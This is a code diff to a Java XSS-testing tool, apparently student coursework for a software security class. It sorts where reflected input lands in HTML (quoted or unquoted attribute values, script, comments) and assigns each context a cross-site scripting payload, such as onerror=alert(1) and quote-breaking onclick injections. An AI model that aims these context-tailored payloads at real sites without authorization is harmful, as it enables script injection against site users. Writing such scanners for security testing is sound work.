@@ -1,4 +1,7 @@
+import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.IOException;
+import java.util.Scanner;
 import java.util.regex.Matcher;
 import java.util.regex.Pattern;
 
@@ -29,7 +32,7 @@ public class Launcher {
 	 * cases; 9 - urls
 	 */
 	static enum CONTEXT {
-		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT, URLS
+		SIMPLE_HTML, HTML_ATTRIBUTE_NAME, HTML_ATTRIBUTE_VALUE_SINGLE,HTML_ATTRIBUTE_VALUE_DOUBLE,HTML_ATTRIBUTE_VALUE_NO, HTML_COMMENTS, JS_FUNC, JS_SINGLE_QUOTES, JS_DOUBLE_QUOTES, JS_SINGLE_COMMENT, JS_MULTI_COMMENT, CSS_CONTEXT, URLS
 	};
 
 	static String urlAttributes = "";
@@ -126,15 +129,37 @@ public class Launcher {
 								} else {
 									System.out.println("ELEMENT NODENAME:" + e.nodeName());
 									System.out.println("attribute:: " + a.getKey() + " :: value is equal to input");
-									context = CONTEXT.HTML_ATTRIBUTE_VALUE;
-									String doc = strDocument;
+//									context = CONTEXT.HTML_ATTRIBUTE_VALUE;
+									String doc = null;
+									try {
+										doc = new Scanner(new File("/Users/kvivekanandan/Desktop/ASU/CSE_545_Software_Security/server/9.html")).useDelimiter("\\Z").next();
+									} catch (FileNotFoundException e1) {
+										e1.printStackTrace();
+									}
 									String tag = e.tagName();
 									Pattern p = Pattern.compile("<"+tag+".*(\\/> | \\/"+tag+">|>)");
 									Matcher m = p.matcher(doc);
 									while(m.find()){
-										String mat = m.toString();
+										String mat = m.group(0);
 										if(mat.contains(a.getKey()) && mat.contains(a.getValue())){
-											System.out.println(mat);
+											System.out.println(m.group(0));
+											String singleQuotes = "'" + input + "'";
+											String doubleQuotes = "\"" + input + "\"";
+											Pattern pSingleQuotes = Pattern.compile(singleQuotes);
+											Pattern pDoubleQuotes = Pattern.compile(doubleQuotes);
+											Matcher sm = pSingleQuotes.matcher(mat);
+											if (sm.find()) {
+												System.out.println("single quotes pattern");
+												context = CONTEXT.HTML_ATTRIBUTE_VALUE_SINGLE;
+												break;
+											}
+											Matcher dm = pDoubleQuotes.matcher(mat);
+											if (dm.find()) {
+												System.out.println("double quotes pattern");
+												context = CONTEXT.HTML_ATTRIBUTE_VALUE_DOUBLE;
+												break;
+											}
+											context = CONTEXT.HTML_ATTRIBUTE_VALUE_NO;
 										}
 									}
 								}
@@ -156,9 +181,16 @@ public class Launcher {
 							payload = "<img src=x onerror=alert(1)>";
 							break;
 						case HTML_ATTRIBUTE_NAME:
-							payload = "onclick=\"alert(1)";
+							payload = "onclick=\"alert(1)\"";
 							break;
-						case HTML_ATTRIBUTE_VALUE:
+						case HTML_ATTRIBUTE_VALUE_SINGLE:
+							payload = "\' onclick=\'alert(1)";
+							break;
+						case HTML_ATTRIBUTE_VALUE_DOUBLE:
+							payload = "\" onclick=\"alert(1)";
+							break;
+						case HTML_ATTRIBUTE_VALUE_NO:
+							payload = "\"\" onclick=alert(1)";
 							break;
 						case JS_FUNC:
 							payload = "-</script><img src=x onerror=alert(1)>";
